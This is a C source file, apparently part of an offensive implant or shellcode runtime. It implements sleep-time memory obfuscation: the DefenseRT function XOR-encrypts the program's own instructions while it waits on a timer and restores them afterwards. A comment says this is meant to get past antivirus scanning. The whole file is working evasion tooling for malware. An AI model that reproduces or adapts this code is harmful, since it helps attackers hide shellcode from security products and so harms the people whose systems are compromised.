#include "c_types.h"
#include "win_types.h"
#include "dll_kernel32.h"
#include "lib_memory.h"
#include "rel_addr.h"
#include "shield.h"

typedef struct {
    uintptr Method;

    VirtualProtect_t      VirtualProtect;
    WaitForSingleObject_t WaitForSingleObject;

    uintptr Reserved;
    void*   CriticalAddr;
    uint    CriticalSize;
    void*   DecoyAddr;
    uint    DecoySize;
    void*   Shelter;
    HANDLE  hTimer;
} sleep_args;

typedef struct {
    uintptr Method;

    VirtualProtect_t VirtualProtect;
    VirtualFree_t    VirtualFree;
    ExitThread_t     ExitThread;

    void* CriticalAddr;
    uint  CriticalSize;
    void* DecoyAddr;
    uint  DecoySize;
} exit_Args;

// Only the instructions related to the DefenseRT function are
// in plain text during Sleep, so if you need to advance AV, 
// you only need to customize this function.

#define XOR_KEY_SIZE 256

void xorInstructions(Shield_Ctx* ctx, byte* key);

__declspec(noinline)
bool DefenseRT(Shield_Ctx* ctx)
{
    // TODO remove it
    ctx->EndAddress = (uintptr)(GetFuncAddr(&DefenseRT));
    // hide runtime(or with shellcode) instructions
    xorInstructions(ctx, ctx->CryptoKey);
    // simulate kernel32.Sleep()
    bool ok = ctx->WaitForSingleObject(ctx->hTimer, INFINITE) == WAIT_OBJECT_0;
    // recover runtime(or with shellcode) instructions
    xorInstructions(ctx, ctx->CryptoKey);
    return ok;
}

void xorInstructions(Shield_Ctx* ctx, byte* key)
{
    // calculate shellcode position
    uintptr beginAddr = ctx->BeginAddress;
    uintptr endAddr   = ctx->EndAddress;
    // hide runtime(or with shellcode) instructions
    byte keyIdx = 0;
    for (uintptr addr = beginAddr; addr < endAddr; addr++)
    {
        byte* data = (byte*)addr;
        byte k = key[keyIdx];
        *data ^= k;
        // select key
        keyIdx = k+1;
    }
}
